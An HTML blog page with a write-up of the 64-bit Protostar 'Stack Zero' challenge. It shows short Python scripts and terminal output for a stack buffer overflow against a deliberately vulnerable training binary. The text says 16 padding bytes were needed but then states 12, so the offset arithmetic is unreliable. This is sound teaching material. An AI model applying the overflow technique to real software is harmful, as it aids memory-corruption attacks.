<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>pwncone.io</title>
    <link rel="stylesheet" href="../../../../css/style.css">
  </head>

<body>

<section>

    <writeup>
        <h1><strong>#Protostar x64 - Stack Zero</strong></h1>
        <a href="https://exploit.education/protostar/stack-zero/">https://exploit.education/protostar/stack-zero/</a><br>
        NOTE 1: Protostar doesn't offer 64-bit versions of the challenges itself. I set it up myself. For setup, refer <a href="../vm-setup/vm-setup.html">here</a><br>
        NOTE 2: I'm writing the 64-bit write-ups as follow-ups to the 32-bit challenges, so I won't be going over the intricacies of the exploit, just the differences involved with it now being a 64-bit challenge instead of 32-bit<br>
        <br>
        <img alt="images\2-1.png" src="images/2-1.png"><br>
        <br>
        The goal of Stack Zero is to overflow the <code>buffer</code> variable, and write data to the <code>modified</code> variable.<br>
        <br>
        In the original challenge, you could simply write 64 bytes of data to fill the <code>buffer</code> variable, and then any byte of junk after that to overwrite the <code>modified</code> variable.<br>
        <br>
            <div class="codebox">
                <span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;exploit.education&nbsp;-&nbsp;Stack&nbsp;Zero</span><br>
                <br>
                <span style="color:#333333;font-weight:400">import</span>&nbsp;struct<br>
                <br>
                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">64</span><br>
                payload&nbsp;+=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;I'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0xdeadc0de</span>)<br>
                <br>
                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
            </div>
        </div><br>
        <br>
        On 64-bit, it appears there's padding between the variables on the stack.<br>
        (I have no idea why, I just learnt this whilst trying to sovle this challenge.)<br>
        <br>
        If you tried to use the script above, you'd be told to "Try again?"<br>
            <div class="codebox">
                user@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>protostar64$&nbsp;python&nbsp;stack0.py&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;bin<span style="color:#ff9d00;font-weight:700">/</span>stack0<br>
                Try&nbsp;again?
            </div>
        </div><br>
        <br>
        <a id="h2-1" name="h2-1"></a><strong></strong>
        <h2><strong>Option #1 - Bruteforce</strong></h2><br>
        We're being told to "Try again?" because we've failed to overwrite the <code>modified</code> variable on the stack, despite having overflowed the <code>buffer</code> variable.<br>
        In that case, the <code>modified</code> must be further on (more than 64 bytes into the stsack).<br>
        The easy/bruteforce option to solve this, then, is to simply keep writing data to the stack until we overwrite <code>modified</code>.<br>
        <br>
        I wrote <code>B</code>s to the stack, in increasing increments of 4.<br>
        After a few tries, 16 <code>B</code>s is what was needed to overwrite the <code>modified</code> variable and get the win string.<br>
            <div class="codebox">
                <span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;Protostar&nbsp;x64&nbsp;-&nbsp;Stack&nbsp;Zero</span><br>
                <br>
                <span style="color:#333333;font-weight:400">import</span>&nbsp;struct<br>
                <br>
                <span style="color:#ff9d00;font-weight:700">buffer</span>&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">64</span><br>
                <br>
                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>&nbsp;*&nbsp;<span style="color:#ff9d00;font-weight:700">buffer</span><br>
                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"B"</span>&nbsp;*&nbsp;<span style="color:#ff0044;font-weight:400">16</span><br>
                <br>
                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
            </div>
        </div><br>
        <br>
            <div class="codebox">
                user@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>protostar64$&nbsp;python&nbsp;stack0.py&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;bin<span style="color:#ff9d00;font-weight:700">/</span>stack0<br>
                you&nbsp;have&nbsp;changed&nbsp;the&nbsp;<span style="color:#3ad900;font-weight:400">'modified'</span>&nbsp;variable
            </div>
        </div><br>
        <br>
        64 byte buffer + 12 bytes of junk = successfull overwrite,<br>
        which means that there must be 76 bytes between the start of the <code>buffer</code> variable and the start of the <code>modified</code> variable on the stack, despite the <code>buffer</code> variable being only 64 bytes long.<br>
        <br>
        There's padding, and I'm not sure why :/<br>
    </writeup>
</section>

</body>
</html>